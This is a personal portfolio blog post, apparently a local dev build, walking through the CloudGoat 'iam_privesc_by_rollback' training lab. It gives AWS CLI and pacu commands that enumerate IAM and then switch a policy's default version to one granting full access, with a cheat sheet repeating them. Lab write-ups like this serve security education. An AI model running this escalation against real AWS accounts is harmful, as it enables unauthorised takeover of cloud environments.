@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png" />
+  <link rel="manifest" href="../../favicon/site.webmanifest" />
+  <link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5" />
+
+  
+  <meta name="msapplication-TileColor" content="#da532c" />
+  <meta name="theme-color" content="#ffffff" />
+
+  
+  <title itemprop="name"> Cloudgoat IAM Privesc By Rollback | Personal Portfolio 
+</title>
+<meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:title" content="Cloudgoat IAM Privesc By Rollback | Personal Portfolio" />
+<meta name="twitter:title" content="Cloudgoat IAM Privesc By Rollback | Personal Portfolio" />
+<meta itemprop="name" content="Cloudgoat IAM Privesc By Rollback | Personal Portfolio" />
+<meta name="application-name" content="Cloudgoat IAM Privesc By Rollback | Personal Portfolio" />
+<meta property="og:description"
+      content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:site_name" content="Personal Portfolio" />
+<meta property="og:url" content="http://localhost:1313/posts/iam_privesc_by_rollback_walkthrough/" />
+<meta property="og:locale" content="en">
+<meta property="og:image" content="/assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo.png" />
+<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo.png" />
+<meta property="og:type" content="article" />
+
+
+  
+  <script>
+    if (
+      localStorage.getItem('color-theme') === 'dark' ||
+      (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
+    ) {
+      document.documentElement.classList.add('dark');
+    } else {
+      document.documentElement.classList.remove('dark');
+    }
+  </script>
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css" />
+
+  
+  
+  
+    
+    <link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />
+  
+
+  
+  <link rel="stylesheet" href="../../css/custom-swiper.css" />
+</head>
+
+</head>
+
+<body class="bg-zinc-100 dark:bg-gray-800">
+    <div class="top-0 z-50 w-full text-gray-700 bg-gray-300 border-b border-gray-300 dark:text-gray-300 dark:bg-gray-900 dark:border-gray-700 md:sticky">
+    <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
+        <div class="flex flex-row items-center justify-between p-4">
+            <a href="../../"
+            class="flex
+                    text-gray-700 dark:text-gray-300
+                    transition-colors
+                    hover:text-gray-900 dark:hover:text-white"
+            >
+            <img
+                src="../../images/cyber-immuno-fusion.png"
+                class="transition-opacity h-9 w-9
+                    hover:opacity-50 focus:opacity-70"
+                alt="Personal Portfolio Logo"
+            />
+            <div
+                class="mt-1 ml-3 text-xl font-black tracking-tight
+                    text-gray-700 dark:text-gray-300 uppercase
+                    transition-colors
+                    hover:text-gray-400 dark:hover:text-white"
+            >
+                Personal Portfolio
+            </div>
+            </a>
+            <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
+                    <path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM9 15a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"></path>
+                    <path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+        </div>
+        <nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row">
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/" title="Home">
+                Home
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/about/" title="About">
+                About
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/biomedical/" title="Biomedical">
+                Biomedical
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/software/" title="Software">
+                Software
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
+                Cybersecurity
+            </a>
+            
+            
+            
+            <button id="theme-toggle" type="button" class="p-2 text-sm text-gray-500 rounded-lg md: dark:text-gray-400 md:hover:bg-gray-100 dark:md:hover:bg-gray-700 md:focus:outline-none md:focus:ring-4 md:focus:ring-gray-200 dark:md:focus:ring-gray-700 md:ml-2 xs:hidden">
+                <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z">
+                    </path>
+                </svg>
+                <svg id="theme-toggle-light-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" aria-label="Dark or Light Mode" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+            
+        </nav>
+    </div>
+</div>
+    
+<article>
+  <header class="mb-4 bg-primary-600">
+    <span class="py-96">
+      <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
+        Cloudgoat IAM Privesc By Rollback
+      </h1>
+    </span>
+  </header>
+  <div class="max-w-4xl mx-auto mt-8 mb-2">
+    <div class="px-6">
+      
+      
+      
+      
+      
+      
+      <img src="../../../assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo_hu_e550b5f9644c2a99.webp" srcset=", /../assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo_hu_3913cb1f0eb98836.webp 400w, /../assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo_hu_5b218c238beb7f86.webp 550w, /../assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo_hu_f1a58e7ba791d0e3.webp 768w, /../assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo_hu_e550b5f9644c2a99.webp 1100w"
+           class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
+           width="100%" alt="" />
+      
+      
+    </div>
+  </div>
+  
+  <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
+    <h1 id="introduction--context">Introduction &amp; Context</h1>
+<p>Bonjour, c&rsquo;est une write-up for the iam_privesc_by_rollback challenge from Cloudgoat available <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md">here</a>.This is a pretty quick and easy lab, where we just need to do some basic enumeration and switch a policy version. No flags or post-exploit work to do really, just search the environment and level up. I&rsquo;ll be providing my workflow, a bit of manual and a bit of automation with pacu, so follow along!</p>
+<h1 id="setup">Setup</h1>
+<p>If you haven&rsquo;t started the instance, run <code>cloudgoat create iam_privesc_by_rollback</code>. It&rsquo;ll load pretty quickly and give a pair of credentials. Add them using <code>aws configure --profile raynor</code> (or really any name doesn&rsquo;t matter) and use the region us-east-1 and format as json. Then just quickly verify they work by running <code>aws sts get-caller-identity --profile raynor</code>.</p>
+<h1 id="enumerate-environment-with-pacu">Enumerate environment with pacu</h1>
+<p>To start off, I&rsquo;m going to try and get a lay of the land by using <a href="https://github.com/RhinoSecurityLabs/pacu">pacu</a> to do some of the initial enumeration. Run <code>pacu</code> to get it installed, then use <code>import_keys raynor</code> to load the credentials in. I&rsquo;ll do a quick run of the iam modules. Type <code>search iam</code> to get the modules about iam and the one of interest first is the profile persmission. After that, we can enumerate the environment for other users, roles, etc. Run these 2 commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run iam__enum_permissions
+</span></span><span style="display:flex;"><span>run iam__enum_users_roles_policies_groups
+</span></span></code></pre></div><p>You&rsquo;ll notice there are only 2 users, one is you and one is cloudgoat. Nothing useful there. The roles are all default ones. You can run <code>data iam</code> to get all the iam data, or filter by running something like <code>data iam TYPE</code> where TYPE is Users, Roles, Policies, Groups. The only half-useful thing is the one policy. Check it by running <code>data iam Policies</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;AttachmentCount&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;CreateDate&#34;</span>: <span style="color:#e6db74">&#34;Thu, 12 Jun 2025 17:21:39&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;DefaultVersionId&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;IsAttachable&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PermissionsBoundaryUsageCount&#34;</span>: <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyId&#34;</span>: <span style="color:#e6db74">&#34;ANPAVRUVQNVQTRFKOIVZD&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyName&#34;</span>: <span style="color:#e6db74">&#34;cg-raynor-policy-cgid77ggvan45x&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;UpdateDate&#34;</span>: <span style="color:#e6db74">&#34;Thu, 12 Jun 2025 17:21:42&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><h1 id="get-policy-details">Get policy details</h1>
+<p>Alright, let&rsquo;s look into that policy. This lab is about policy version control and right now it appears the default version is v1, which is what we have. To see what this policy on its version can do, run this: <code>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v1 --profile raynor</code>.</p>
+<p>So with this current version, we can do a few things on iam. We can get and list and fancy enough set a default policy version. With that, we can think of an attack path. If we find a policy version that has more permissions, we can set that version as the default and gain those privileges. To check other policies, just change the version number for the version id flag. The ones I ran were:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v2 --profile raynor
+</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor
+</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v4 --profile raynor
+</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v5 --profile raynor
+</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v6 --profile raynor
+</span></span></code></pre></div><p>I didn&rsquo;t myself, but if you want to check what versions exist, you could run <code>aws iam list-policy-versions --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --profile raynor</code> and confirm the number that exist. The last one appeared to be v6, but we would have found the juicy one well before that. Take a look at v3. That version lets you do anything on any resource.</p>
+<h1 id="escalate">Escalate</h1>
+<p>To change the version now, its just one short command I had to lookup <code>aws iam set-default-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor</code></p>
+<p>And done! You now have complete access to the AWS environment.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This was one of the shortest labs I&rsquo;ve done on cloudgoat, I finished it under 15 minutes I think. All we had to do was quickly enumerate the environment, grab some policy details and change the version. A quick and easy lab teaching the importance of proper access controls. Never give user more permissions than they need!</p>
+<p><em>Don&rsquo;t forget to destroy your lab after!</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy iam_privesc_by_rollback
+</span></span></code></pre></div><h1 id="cheat-sheet">Cheat Sheet</h1>
+<p>To close off, here&rsquo;s a quick summary of the commands we needed to run to complete this module. If you&rsquo;re ever coming back to this and just need that one command, this is the section to check.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up</span>
+</span></span><span style="display:flex;"><span>cloudgoat create iam_privesc_by_rollback
+</span></span><span style="display:flex;"><span>aws configure --profile raynor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Pacu our permissions</span>
+</span></span><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>import_keys raynor
+</span></span><span style="display:flex;"><span>run iam__enum_permissions
+</span></span><span style="display:flex;"><span>run iam__enum_users_roles_policies_groups
+</span></span><span style="display:flex;"><span>data iam Users
+</span></span><span style="display:flex;"><span>data iam Roles
+</span></span><span style="display:flex;"><span>data iam Policies
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Get Policy Details</span>
+</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v1 --profile raynor
+</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#List versions</span>
+</span></span><span style="display:flex;"><span>aws iam list-policy-versions --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --profile raynor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Escalate</span>
+</span></span><span style="display:flex;"><span>aws iam set-default-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Shutdown</span>
+</span></span><span style="display:flex;"><span>cloudgoat destroy iam_privesc_by_rollback
+</span></span></code></pre></div>
+  </div>
+</article>
+
+    
+
+<script src="../../js/darkmode.js" defer></script>
+<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+
+<footer class="bg-gray-200 dark:bg-gray-900 border-t border-gray-300 dark:border-gray-700">
+  <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
+
+    
+    <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/about/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          About
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/biomedical/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Biomedical
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/software/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Software
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/cybersecurity/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Cybersecurity
+        </a>
+      </div>
+      
+    </nav>
+
+    
+    <p class="mt-8 text-base text-center text-gray-600 dark:text-gray-400">
+      &copy; 2025 Personal Portfolio. All rights reserved.
+    </p>
+
+    
+    <p class="mt-2 text-base text-center text-gray-800 dark:text-gray-300">
+      Theme made with ❤️ by
+      <a href="https://nusserstudios.com"
+         class="hover:underline text-gray-800 dark:text-gray-300 hover:text-black dark:hover:text-white transition-colors">
+        <span class="font-black uppercase">Nusser</span>
+        <span class="font-light uppercase">Studios.</span>
+      </a>
+    </p>
+
+  </div>
+</footer>
+
+</body>
+
+</html>
